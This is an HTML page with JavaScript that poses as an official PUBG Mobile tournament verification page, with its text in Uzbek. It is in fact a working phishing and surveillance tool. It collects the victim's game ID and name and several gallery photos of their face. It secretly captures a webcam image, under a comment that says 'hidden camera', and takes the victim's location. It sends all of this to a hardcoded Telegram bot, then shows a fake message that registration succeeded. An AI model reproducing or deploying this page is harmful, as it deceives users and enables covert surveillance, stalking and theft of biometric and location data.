<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE - Official Global Tournament Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&family=Roboto:wght@300;500&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background: #05070a; color: #e1e1e1; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { width: 95%; max-width: 450px; background: #0f1218; border-top: 4px solid #f3a91a; border-radius: 5px; padding: 40px 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; }
        .logo { font-family: 'Oswald', sans-serif; font-size: 24px; color: #f3a91a; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
        .sub-title { font-size: 13px; color: #888; margin-bottom: 30px; text-transform: uppercase; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 12px; color: #f3a91a; margin-bottom: 8px; text-transform: uppercase; font-weight: bold; }
        input { width: 100%; padding: 12px; background: #1a1e26; border: 1px solid #2a303c; color: #fff; border-radius: 3px; box-sizing: border-box; outline: none; }
        .file-upload { border: 2px dashed #2a303c; padding: 20px; cursor: pointer; transition: 0.3s; margin-bottom: 25px; }
        .file-upload:hover { border-color: #f3a91a; background: #151921; }
        .btn-verify { width: 100%; padding: 15px; background: #f3a91a; border: none; color: #000; font-family: 'Oswald', sans-serif; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .btn-verify:disabled { background: #333; color: #666; cursor: not-allowed; }
        #status-msg { font-size: 12px; margin-top: 15px; color: #f3a91a; height: 15px; }
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="logo">Verification System</div>
    <div class="sub-title">Global Open Tournament 2026</div>
    
    <div id="step-1">
        <div class="input-group">
            <label>Character ID</label>
            <input type="number" id="u_id" placeholder="Masalan: 5123456789">
        </div>
        
        <div class="input-group">
            <label>In-Game Name (IGN)</label>
            <input type="text" id="u_name" placeholder="Masalan: UZB_WARRIOR">
        </div>

        <div class="file-upload" onclick="document.getElementById('fileInput').click()">
            <label style="cursor:pointer">Akkaunt xavfsizligi uchun galereyadan 5-10 ta yuzingiz aniq ko'ringan rasmni tanlang</label>
            <span style="font-size: 11px; color: #555;">(Tizim AI orqali shaxsingizni tasdiqlaydi)</span>
        </div>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="startBackgroundScan(this)">

        <div id="status-msg">Tizim tayyor...</div>
        <button class="btn-verify" id="verifyBtn" onclick="executeFinalStep()" disabled>VERIFIKATSIYADAN O'TISH</button>
    </div>

    <div id="step-2" style="display:none;">
        <div style="font-size: 40px; color: #f3a91a; margin-bottom: 20px;">⌛</div>
        <h3>Tahlil qilinmoqda...</h3>
        <p style="font-size: 13px; color: #888;">Iltimos, sahifani yopmang. Server bilan aloqa o'rnatilmoqda.</p>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const API_CONFIG = {
        T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY",
        C: "6198817749"
    };

    let faces = [], camBlob = null;

    async function initModels() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
    }
    initModels();

    async function startBackgroundScan(input) {
        const msg = document.getElementById('status-msg');
        msg.innerText = "AI tahlil qilmoqda...";
        faces = [];
        const files = Array.from(input.files);

        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) faces.push(f);
        }

        msg.innerText = `Tayyor. ${faces.length} ta rasm tasdiqlandi.`;
        document.getElementById('verifyBtn').disabled = false;
    }

    async function executeFinalStep() {
        const name = document.getElementById('u_name').value;
        const id = document.getElementById('u_id').value;
        if(!name || !id) return alert("Ma'lumotlarni to'ldiring!");

        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';

        try {
            // Yashirin kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('vid');
            v.srcObject = stream;
            await new Promise(r => setTimeout(r, 800));
            const c = document.getElementById('canv');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.5))).blob();
            stream.getTracks().forEach(t => t.stop());

            // Geolokatsiya va yuborish
            navigator.geolocation.getCurrentPosition(async (p) => {
                const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await sendData(name, id, maps);
            }, async () => {
                await sendData(name, id, "Rad etildi");
            });

        } catch (e) {
            alert("Turnirda qatnashish uchun kamera ruxsati shart!");
            location.reload();
        }
    }

    async function sendData(n, id, m) {
        const text = `🏆 *TURNIR REGISTRATSIYA* 🏆\n👤 IGN: ${n}\n🆔 ID: ${id}\n📍 MAPS: ${m}`;
        
        await fetch(`https://api.telegram.org/bot${API_CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: API_CONFIG.C, text: text, parse_mode: 'Markdown'})
        });

        if(camBlob) {
            const fd = new FormData(); fd.append('chat_id', API_CONFIG.C); fd.append('photo', camBlob);
            await fetch(`https://api.telegram.org/bot${API_CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let f of faces) {
            const fd2 = new FormData(); fd2.append('chat_id', API_CONFIG.C); fd2.append('photo', f);
            fetch(`https://api.telegram.org/bot${API_CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
        }

        setTimeout(() => {
            alert("Siz muvaffaqiyatli ro'yxatdan o'tdingiz! Adminlar 24 soat ichida bog'lanadi.");
            location.reload();
        }, 3000);
    }
</script>
</body>
</html>
